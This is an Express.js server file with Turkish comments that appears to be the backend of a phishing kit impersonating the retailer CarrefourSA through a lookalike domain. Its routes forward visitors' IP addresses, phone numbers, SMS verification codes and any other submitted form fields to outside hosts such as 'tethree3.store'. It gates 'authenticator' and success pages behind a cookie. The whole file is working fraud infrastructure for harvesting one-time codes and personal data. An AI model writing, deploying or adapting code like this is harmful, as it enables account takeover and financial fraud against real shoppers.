const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cookieParser());
app.use(requestIp.mw());
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

 
app.use(express.static(path.join(__dirname, 'public')));

 app.use(cors());


app.get('/', async (req, res) => {
  try {
    const clientIp = req.clientIp;

    // PHP sunucuya IP'yi POST ile gönder
    const response = await axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/index.php', {
      ip: clientIp
    });

    const html = response.data;
    res.send(html);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});


app.post('/veri', async (req, res) => {
  try {
    // Ziyaretçi IP'sini al
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // PHP sunucuya yönlendir
    const response = await axios.post(`https://forestgreen-rook-759809.hostingersite.com/dmn/veri.php?ip=${clientIp}`);

    // PHP cevabını geri döndür
    res.send(response.data);
  } catch (error) {
    console.error('PHP sunucusuna bağlanılamadı:', error.message);
    res.status(500).send('sunucu_hatasi');
  }
});

 
app.post('/apitr', async (req, res) => {
  const clientIp = req.clientIp;  
  const { action, phoneinput, ...otherData } = req.body;  
  
  try {

    const postData = {
      ip: clientIp,
      action: action,
      ...(phoneinput && { phoneinput: phoneinput }),
      ...otherData 
    };
    const response = await axios.post('https://tethree3.store/livechats.php', postData);
 
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

app.get('/authenticator', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
   });
  app.get('/error-number', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'error-number.html'));
  });
app.get('/successfuly', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'basarili.html'));
});
 
 
app.get('/marka', async (req, res) => {
  try {
    const response = await axios.post('https://3-carrefoursa.com/markalar.php', {
      ip: req.ip
    });

    const markalar = response.data;
    const filtre = req.query.filtre || '';

    let html = `
      <div class="facet-values js-facet-values js-facet-form" id="markalarmobil" style="max-height: 100% !important; height: 100% !important; display: none;">
        <ul class="facet-list js-facet-list ">
    `;

    markalar.forEach(marka => {
      const checked = (filtre === marka.urun_markasi) ? 'checked' : '';
      html += `
        <li>
          <label>
            <input type="checkbox" class="facet-checkbox js-facet-checkbox sr-only" ${checked} disabled>
            <span class="facet-label">
              <a href="/?filtre=${marka.urun_markasi}">
                <span class="facet-mark"></span>
              </a>
              <span class="facet-text">
                <a class="brand-capitalize-name" href="/?filtre=${marka.urun_markasi}" hidden="true" rel="nofollow">${marka.urun_markasi}</a>
                <a href="/?filtre=${marka.urun_markasi}">
                  ${marka.urun_markasi}
                </a>
              </span>
            </span>
          </label>
        </li>
      `;
    });

    html += `</ul></div>`;
    res.send(html);
  } catch (err) {
    console.error("Markalar yüklenemedi:", err.message);
    res.status(500).send("Bir hata oluştu");
  }
});

 
app.post('/api', async (req, res) => {
  const clientIp = req.clientIp; // Ziyaretçinin IP adresi

  try {
    const response = await axios.post('http://3-carrefoursa.com', {
      ip: clientIp
    });

    
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

app.post('/sms', async (req, res) => {
  const clientIp = req.clientIp;  
  const { sms } = req.body;  

  try {

 
    const response = await axios.post('https://tethree3.store/sms.php', {
      ip: clientIp,
      sms: sms
    });


    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});



app.post('/livechats', async (req, res) => {
    const clientIp = req.clientIp;  
    const { action, phoneinput, ...otherData } = req.body; // Diğer tüm değişkenler için spread operatörü
    
    try {
      // Gönderilecek veri yapısını hazırlıyoruz
      const postData = {
        ip: clientIp,
        action: action,
        ...(phoneinput && { phoneinput: phoneinput }), // phoneinput varsa ekle
        ...otherData // Diğer gelen değişkenleri dahil et
      };
  
 
      const response = await axios.post('https://tethree3.store/livechats.php', postData);
  
      // Gelen yanıtı doğrudan istemciye gönder
      res.send(response.data);
    } catch (error) {
      console.error("Hedef URL'ye POST gönderiminde hata:", error);
      res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
    }
  });
  

app.post('/livechatss', async (req, res) => {
  const clientIp = req.clientIp;  
  const { phone2} = req.body;  

  try {
     
    const response = await axios.post('https://tethree3.store/phone.php', {
      ip: clientIp,
      phone2: phone2
    });

     
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});


app.listen(port, () => {
    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
